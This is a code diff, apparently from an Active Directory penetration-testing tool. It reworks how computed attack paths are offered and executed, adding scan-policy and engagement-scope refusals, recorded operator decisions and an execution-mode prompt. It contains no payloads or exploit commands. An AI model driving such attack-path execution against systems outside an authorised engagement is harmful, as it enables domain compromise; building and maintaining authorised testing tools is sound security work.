-            prompt_default = "0" if default_idx >= skip_idx else str(default_idx + 1)
+            # Typed numbers follow the listing's numbering; map them back to the
+            # offered option (a number that is not offered reads as "skip").
+            prompt_default = (
+                "0" if default_idx >= len(offer_indices) else str(offer_indices[default_idx] + 1)
+            )
             selection = Prompt.ask(
                 "Select an attack path index (or 0 to skip)", default=prompt_default
             )
@@ -19193,10 +21719,10 @@ def _offer_attack_paths_for_execution_summaries_impl(
                 selection_idx = int(selection)
             except ValueError:
                 selection_idx = 0
-            if selection_idx <= 0:
-                selected_idx = len(options) - 1
+            if selection_idx - 1 in offer_indices:
+                selected_idx = offer_indices.index(selection_idx - 1)
             else:
-                selected_idx = min(selection_idx - 1, len(options) - 1)
+                selected_idx = skip_idx
 
         if selected_idx is None:
             print_info_debug(
@@ -19210,16 +21736,22 @@ def _offer_attack_paths_for_execution_summaries_impl(
             )
             return executed
 
-        if (
+        selected_is_execute_all = (
             allow_execute_all
             and execute_all_idx is not None
             and selected_idx == execute_all_idx
-        ):
+        )
+        if not selected_is_execute_all:
+            # Back from the offered option to the summary it stands for.
+            selected_idx = offer_indices[selected_idx]
+
+        if selected_is_execute_all:
             # Batch execution mode: attempt remaining theoretical paths (by default)
             candidates: list[dict[str, Any]] = []
             skipped_no_context = 0
             skipped_unsupported = 0
             skipped_blocked = 0
+            skipped_scan_policy = 0
             for summary in summaries:
                 status = str(summary.get("status") or "theoretical").strip().lower()
                 if not _status_allowed_by_filter(status, desired_statuses_set):
@@ -19239,6 +21771,9 @@ def _offer_attack_paths_for_execution_summaries_impl(
                 if support_status == "blocked":
                     skipped_blocked += 1
                     continue
+                if support_status == scan_policy_enforcement.EXECUTION_STATUS_EXCLUDED:
+                    skipped_scan_policy += 1
+                    continue
                 if not _path_is_supported_for_execution(summary):
                     skipped_unsupported += 1
                     continue
@@ -19246,6 +21781,12 @@ def _offer_attack_paths_for_execution_summaries_impl(
                     skipped_no_context += 1
                     continue
                 candidates.append(summary)
+
+            if skipped_scan_policy > 0:
+                print_info(
+                    f"{skipped_scan_policy} attack path(s) not executed: their first "
+                    "step is excluded by scan policy."
+                )
 
             if not candidates:
                 if skipped_unsupported > 0:
@@ -19377,6 +21918,18 @@ def _offer_attack_paths_for_execution_summaries_impl(
             if isinstance(selected_meta, dict)
             else ""
         )
+        if execution_support_status == scan_policy_enforcement.EXECUTION_STATUS_EXCLUDED:
+            _refuse_path_for_scan_policy(shell, domain=domain, summary=selected)
+            if single_pass:
+                return executed
+            _record_attempt(selected_idx)
+            continue
+        if execution_support_status == _EXECUTION_STATUS_OUTSIDE_SCOPE:
+            _refuse_path_outside_engagement_scope(shell, domain=domain, summary=selected)
+            if single_pass:
+                return executed
+            _record_attempt(selected_idx)
+            continue
         if execution_support_status == "blocked":
             warning_message, debug_reason = _execution_block_message(selected_meta)
             marked_action = mark_sensitive(
@@ -19565,9 +22118,12 @@ def _offer_attack_paths_for_execution_summaries_impl(
                 f"domain={marked_domain} status={mark_sensitive(computer_viability_status, 'detail')}"
             )
 
+        # ``reexecute_exploited_default`` is the recheck walk: re-executing a
+        # proven path is exactly what the operator asked for, so the default
+        # (and the unattended answer) is yes. Every other caller keeps "no".
         if status == "exploited" and not _confirm_or_default(
             "This path is already exploited. Execute again?",
-            default=False,
+            default=reexecute_exploited_default,
         ):
             print_info_debug(
                 f"[attack_paths] execution skipped: domain={marked_domain} reason=already_exploited_no_reexec"
@@ -19591,12 +22147,36 @@ def _offer_attack_paths_for_execution_summaries_impl(
             _record_attempt(selected_idx)
             continue
 
-        if not _confirm_or_default(
-            "Execute this attack path now?",
-            default=True,
-        ):
+        # One decision for how to run the path: continuously (default), step
+        # through, or not now. It travels through the shared remote-capable
+        # select, so the web renders it with the plan and an unattended run
+        # resolves it to the default without blocking.
+        selected_run_id = new_run_id()
+        selected_execution_mode = prompt_execution_mode(
+            shell,
+            domain=domain,
+            summary=selected,
+            run_id=selected_run_id,
+            default_mode=resolve_default_execution_mode(shell),
+        )
+        if selected_execution_mode is None:
             print_info_debug(
                 f"[attack_paths] execution skipped: domain={marked_domain} reason=user_declined"
+            )
+            # The route stays mapped and unexecuted: record WHY on its steps
+            # (declined, with who and when; or no answer from the console), so
+            # the report and the domain verdict never read it as a route that
+            # was tried, and never read a missing answer as a decision.
+            from adscan_internal.services.operator_decisions import (  # noqa: PLC0415
+                record_operator_decision,
+                resolve_negative_decision,
+            )
+
+            record_operator_decision(
+                shell,
+                domain=domain,
+                summary=selected,
+                decision=resolve_negative_decision(shell),
             )
             if single_pass:
                 return executed
@@ -19618,6 +22198,8 @@ def _offer_attack_paths_for_execution_summaries_impl(
             context_username=context_username,
             context_password=context_password,
             search_mode_label=selected_search_mode_label,
+            execution_mode=selected_execution_mode,
+            run_id=selected_run_id,
         )
         if executed:
             if not was_pwned_at_start and _domain_now_pwned():
@@ -19710,6 +22292,10 @@ def _offer_attack_paths_for_execution_summaries_impl(
                         desired_statuses_set,
                     )
                     and not _path_was_attempted_this_session(summary)
+                    # A route that is never offered (policy-excluded first
+                    # step, outside the scope) can never be tried: it must not
+                    # keep the loop from converging.
+                    and _path_offerable_for_execution(summary)
                     for summary in summaries
                 )
             ):
@@ -19876,6 +22462,7 @@ def offer_attack_paths_for_execution_summaries(
     snapshot_target: str = "highvalue",
     snapshot_target_mode: str = "object",
     auto_continue_theoretical_in_non_interactive: bool = True,
+    reexecute_exploited_default: bool = False,
 ) -> bool:
     """Shared execution seam for showing/executing computed attack-path summaries.
 
@@ -19931,6 +22518,7 @@ def offer_attack_paths_for_execution_summaries(
             auto_continue_theoretical_in_non_interactive=(
                 auto_continue_theoretical_in_non_interactive
             ),
+            reexecute_exploited_default=reexecute_exploited_default,
             _refresh_deferred_sink=refresh_deferred,
         )
         return executed
